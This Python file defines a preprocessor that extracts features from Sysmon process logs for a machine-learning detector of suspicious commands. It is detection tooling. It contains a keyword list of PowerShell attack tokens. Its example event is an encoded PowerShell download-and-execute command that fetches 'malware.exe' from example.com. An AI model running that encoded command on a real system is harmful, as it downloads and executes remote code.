import pandas as pd
import numpy as np
import re
import json
from typing import Dict, List, Any, Optional, Union
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SysmonPreprocessor:
    """Class for preprocessing Sysmon log data for ML model training and prediction"""
    
    def __init__(self):
        """Initialize the preprocessor with default settings"""
        self.feature_columns = [
            'command_length',
            'has_suspicious_keywords',
            'process_name_length',
            'user_name_length',
            'is_system_user',
            'has_network_activity',
            'has_file_operations',
            'has_registry_operations'
        ]
        
        # Common suspicious patterns and indicators
        self.suspicious_keywords = [
            'powershell', 'cmd', 'wget', 'curl', 'invoke-', 'iex',
            'download', 'http', 'https', 'malware', 'exploit', 'shellcode',
            'bypass', 'obfuscate', 'encodedcommand', 'noprofile', 'noninteractive',
            'executionpolicy', 'hidden', 'windowstyle', 'nologo', 'noprofile',
            'nologo', 'noni', 'ep', 'enc', 'b64', 'base64', 'iex', 'invoke-expression',
            'downloadstring', 'webclient', 'net.webclient', 'system.net.webclient',
            'start-process', 'start-sleep', 'new-object'
        ]
        
        self.network_keywords = ['http', 'https', 'tcp', 'udp', 'dns', 'port', 'connect', 'listen']
        self.file_ops_keywords = ['copy', 'move', 'del', 'rm', 'wget', 'curl', 'download', 'upload', 'write', 'read']
        self.registry_ops_keywords = ['reg add', 'reg delete', 'reg import', 'reg save', 'reg query', 'reg export']
        self.system_users = ['system', 'local system', 'nt authority\\system', 'root', 'admin']
    
    def extract_features(self, events: Union[Dict[str, Any], List[Dict[str, Any]]]) -> pd.DataFrame:
        """
        Extract features from raw Sysmon events
        
        Args:
            events: Single event dictionary or list of event dictionaries
            
        Returns:
            DataFrame with extracted features
        """
        if not events:
            return pd.DataFrame(columns=self.feature_columns)
            
        # Convert single event to list for consistent processing
        if isinstance(events, dict):
            events = [events]
            
        processed_data = []
        
        for event in events:
            try:
                # Initialize feature dictionary with default values
                features = {
                    'command_length': 0,
                    'has_suspicious_keywords': 0,
                    'process_name_length': 0,
                    'user_name_length': 0,
                    'is_system_user': 0,
                    'has_network_activity': 0,
                    'has_file_operations': 0,
                    'has_registry_operations': 0
                }
                
                # Extract basic features
                command_line = str(event.get('command_line', '')).lower()
                process_name = str(event.get('process_name', '')).lower()
                user = str(event.get('user', '')).lower()
                
                # Command line features
                features['command_length'] = len(command_line)
                features['process_name_length'] = len(process_name)
                features['user_name_length'] = len(user)
                
                # Check for suspicious keywords
                if any(keyword in command_line for keyword in self.suspicious_keywords):
                    features['has_suspicious_keywords'] = 1
                
                # Check for system user
                if any(sys_user in user for sys_user in self.system_users):
                    features['is_system_user'] = 1
                
                # Check for network activity
                if any(net in command_line for net in self.network_keywords):
                    features['has_network_activity'] = 1
                
                # Check for file operations
                if any(op in command_line for op in self.file_ops_keywords):
                    features['has_file_operations'] = 1
                
                # Check for registry operations
                if any(reg in command_line for reg in self.registry_ops_keywords):
                    features['has_registry_operations'] = 1
                
                # Add event ID for reference
                features['event_id'] = event.get('event_id', '')
                
                processed_data.append(features)
                
            except Exception as e:
                logger.error(f"Error processing event {event.get('event_id', 'unknown')}: {str(e)}")
                continue
        
        # Convert to DataFrame with consistent column order
        if processed_data:
            df = pd.DataFrame(processed_data)
            # Ensure all feature columns exist (in case of empty data)
            for col in self.feature_columns:
                if col not in df.columns:
                    df[col] = 0
            return df[['event_id'] + self.feature_columns] if 'event_id' in df.columns else df[self.feature_columns]
        else:
            return pd.DataFrame(columns=self.feature_columns)
    
    def normalize_features(self, df: pd.DataFrame) -> np.ndarray:
        """
        Normalize features for model input
        
        Args:
            df: DataFrame with features to normalize
            
        Returns:
            Numpy array of normalized features
        """
        if df.empty:
            return np.array([])
            
        # Select only the feature columns that exist in the dataframe
        existing_cols = [col for col in self.feature_columns if col in df.columns]
        
        if not existing_cols:
            logger.warning("No feature columns found for normalization")
            return np.array([])
            
        # Convert to numpy array for processing
        features = df[existing_cols].values
        
        # Apply min-max scaling (example - in practice, use the same scaler as training)
        # Note: In a real scenario, you would use a pre-fitted scaler
        min_vals = features.min(axis=0)
        max_vals = features.max(axis=0)
        
        # Avoid division by zero
        range_vals = max_vals - min_vals
        range_vals[range_vals == 0] = 1
        
        normalized = (features - min_vals) / range_vals
        
        return normalized
    
    def process_json_file(self, filepath: str) -> List[Dict[str, Any]]:
        """
        Process a JSON file containing Sysmon events
        
        Args:
            filepath: Path to JSON file
            
        Returns:
            List of processed events
        """
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            if isinstance(data, list):
                return data
            elif isinstance(data, dict):
                if 'events' in data:
                    return data['events']
                return [data]  # Single event
            else:
                raise ValueError("Invalid JSON format: expected array or object with 'events' key")
                
        except json.JSONDecodeError as e:
            logger.error(f"Error parsing JSON file: {str(e)}")
            raise ValueError(f"Invalid JSON file: {str(e)}")
        except Exception as e:
            logger.error(f"Error processing file {filepath}: {str(e)}")
            raise
    
    def process_raw_event(self, event: Dict[str, Any]) -> Dict[str, Any]:
        """
        Process a single raw Sysmon event into a standardized format
        
        Args:
            event: Raw event dictionary
            
        Returns:
            Standardized event dictionary
        """
        try:
            # Extract common fields (adjust based on your Sysmon schema)
            processed = {
                'event_id': event.get('Event', {}).get('System', {}).get('EventRecordID', ''),
                'timestamp': event.get('Event', {}).get('System', {}).get('TimeCreated', {}).get('@SystemTime', ''),
                'process_name': '',
                'process_id': '',
                'command_line': '',
                'user': '',
                'parent_process': '',
                'parent_process_id': ''
            }
            
            # Extract process information (Sysmon Event ID 1)
            if 'EventData' in event.get('Event', {}):
                ed = event['Event']['EventData']
                processed.update({
                    'process_name': ed.get('Image', ''),
                    'process_id': ed.get('ProcessId', ''),
                    'command_line': ed.get('CommandLine', ''),
                    'user': ed.get('User', ''),
                    'parent_process': ed.get('ParentImage', ''),
                    'parent_process_id': ed.get('ParentProcessId', '')
                })
            
            return processed
            
        except Exception as e:
            logger.error(f"Error processing raw event: {str(e)}")
            return {}

# Example usage
if __name__ == "__main__":
    # Initialize preprocessor
    preprocessor = SysmonPreprocessor()
    
    # Example event
    test_events = [
        {
            "event_id": "1",
            "process_name": "powershell.exe",
            "command_line": "powershell -nop -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA=",
            "user": "SYSTEM"
        },
        {
            "event_id": "2",
            "process_name": "chrome.exe",
            "command_line": "chrome --new-tab https://google.com",
            "user": "user1"
        }
    ]
    
    # Extract features
    features_df = preprocessor.extract_features(test_events)
    print("\nExtracted Features:")
    print(features_df)
    
    # Normalize features
    normalized = preprocessor.normalize_features(features_df.drop('event_id', axis=1))
    print("\nNormalized Features:")
    print(normalized)
